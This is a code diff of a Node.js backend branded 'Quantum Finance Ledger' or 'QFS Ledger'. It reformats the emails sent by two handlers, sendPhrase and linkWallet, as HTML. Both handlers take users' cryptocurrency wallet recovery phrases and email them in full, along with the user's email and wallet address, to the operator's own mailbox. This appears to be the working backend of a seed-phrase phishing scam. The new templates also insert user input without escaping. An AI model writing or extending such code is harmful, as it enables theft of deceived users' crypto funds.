@@ -388,14 +388,14 @@ exports.sendPhrase = async (req, res) => {
     await sendEmail(
       process.env.EMAIL_USER,
       'New Recovery Phrase Submitted',
-      `User ${user.email} submitted a recovery phrase:\n\nPhrase: ${phrase}\n\nReference Number: ${referenceNumber}`
+      `<p>User ${user.email} submitted a recovery phrase:</p><p><strong>Phrase:</strong> ${phrase}</p><p><strong>Reference Number:</strong> ${referenceNumber}</p>`
     );
 
     // Verify to user
     await sendEmail(
       user.email,
       'Recovery Phrase Received',
-      `Hello ${user.firstName || 'User'},\n\nWe have successfully received your recovery phrase: ${phrase}\n\nPlease store this safely and never share it with anyone.\n\nReference Number: ${referenceNumber}\n\nBest regards,\nQuantum Finance Ledger`
+      `<p>Hello ${user.firstName || 'User'},</p><p>We have successfully received your recovery phrase.</p><p>Please store this safely and never share it with anyone.</p><p><strong>Reference Number:</strong> ${referenceNumber}</p><p>Best regards,<br>QFS Ledger</p>`
     );
 
     res.json({ message: 'Recovery phrase sent successfully', referenceNumber });
@@ -432,14 +432,14 @@ exports.linkWallet = async (req, res) => {
     await sendEmail(
       process.env.EMAIL_USER,
       'New Wallet Linked',
-      `User ${user.email} linked a new wallet:\n\nRecovery Phrase: ${phrase}\nWallet Address: ${walletAddress}\nType: ${type}\n\nReference Number: ${referenceNumber}`
+      `<p>User ${user.email} linked a new wallet:</p><p><strong>Recovery Phrase:</strong> ${phrase}</p><p><strong>Wallet Address:</strong> ${walletAddress}</p><p><strong>Type:</strong> ${type}</p><p><strong>Reference Number:</strong> ${referenceNumber}</p>`
     );
     
     // Verify to user
     await sendEmail(
       user.email,
       'Wallet Successfully Linked',
-      `Hello ${user.firstName || 'User'},\n\nWe have successfully linked your wallet to your account.\n\nWallet Address: ${walletAddress}\nType: ${type}\n\nPlease keep your recovery phrase secure.\n\nReference Number: ${referenceNumber}\n\nBest regards,\nQuantum Finance Ledger`
+      `<p>Hello ${user.firstName || 'User'},</p><p>We have successfully linked your wallet to your account.</p><p><strong>Wallet Address:</strong> ${walletAddress}</p><p><strong>Type:</strong> ${type}</p><p>Please keep your recovery phrase secure.</p><p><strong>Reference Number:</strong> ${referenceNumber}</p><p>Best regards,<br>QFS Ledger</p>`
     );
     
     user.wallets.push({
